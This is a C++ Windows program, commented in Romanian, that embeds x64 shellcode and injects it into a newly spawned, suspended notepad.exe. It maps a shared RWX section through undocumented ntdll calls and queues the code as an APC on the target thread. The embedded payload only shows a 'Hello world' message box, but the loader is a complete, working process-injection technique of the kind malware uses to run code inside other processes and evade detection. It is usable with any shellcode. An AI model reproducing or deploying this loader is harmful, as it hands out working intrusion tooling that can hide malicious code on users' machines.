#include <iostream>
#include <Windows.h>
#include <vector>

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

using NtCreateSection = NTSTATUS(NTAPI*)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
	IN OPTIONAL PLARGE_INTEGER MaximumSize,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN OPTIONAL HANDLE FileHandle);

using NtMapViewOfSection = NTSTATUS(NTAPI*)(
	IN HANDLE SectionHandle,
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG_PTR ZeroBits,
	IN SIZE_T CommitSize,
	IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
	IN OUT PSIZE_T ViewSize,
	IN DWORD InheritDisposition,
	IN ULONG AllocationType,
	IN ULONG Win32Protect);

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;

using NtUnmapViewOfSection = NTSTATUS(NTAPI*)(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress OPTIONAL);

char shellcode[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";


int main() {

	// function import module
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

	NtCreateSection ntCreateSection = (NtCreateSection)
		GetProcAddress(hNtdll, "NtCreateSection");

	NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)
		GetProcAddress(hNtdll, "NtMapViewOfSection");

	NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)
		GetProcAddress(hNtdll, "NtUnmapViewOfSection");

	HANDLE hSection;
	LARGE_INTEGER szSection = { sizeof(shellcode) };

	NTSTATUS status = ntCreateSection(
		&hSection, // handle-ul sectiunii
		SECTION_ALL_ACCESS,
		NULL,
		&szSection, // marimea sectiunii create
		PAGE_EXECUTE_READWRITE, // permisiuni - RWX
		SEC_COMMIT, // pornim atributul commit
		NULL);

	PVOID hLocalAddress = NULL;
	SIZE_T viewSize = 0;

	status = ntMapViewOfSection(
		hSection,
		GetCurrentProcess(), // specificam handle-ul procesului curent
		&hLocalAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);

	RtlCopyMemory(hLocalAddress, shellcode, sizeof(shellcode));

	PVOID hRemoteAddress = NULL; // adresa preluata de sectiune, in cadrul procesului tinta

	LPSTARTUPINFOW       si;
	PPROCESS_INFORMATION pi;
	BOOL                 success;

	si = new STARTUPINFOW();
	si->cb = sizeof(LPSTARTUPINFOW);

	pi = new PROCESS_INFORMATION();

	wchar_t cmd[] = L"notepad.exe\0"; // procesul pe care il creem

	success = CreateProcess(
		NULL,
		cmd,
		NULL,
		NULL,
		FALSE, // daca handle-ul va fi mostenit de la procesul parinte
		CREATE_SUSPENDED,
		NULL,
		NULL,
		si, // pointer la STARTUPINFO sau STARTUPINFOEX - necesar
		pi); // pointer la PROCESS_INFORMATION - necesar

	status = ntMapViewOfSection(
		hSection,
		pi->hProcess, // specificam handle-ul procesului tinta
		&hRemoteAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);

	QueueUserAPC(
		(PAPCFUNC)hRemoteAddress, // pointer catre functia executata ca shellcode
		pi->hThread, // handle-ul thread-ului
		0
	);

	ResumeThread(pi->hThread);

	status = ntUnmapViewOfSection(
		GetCurrentProcess(),
		hLocalAddress);

    return 0;
}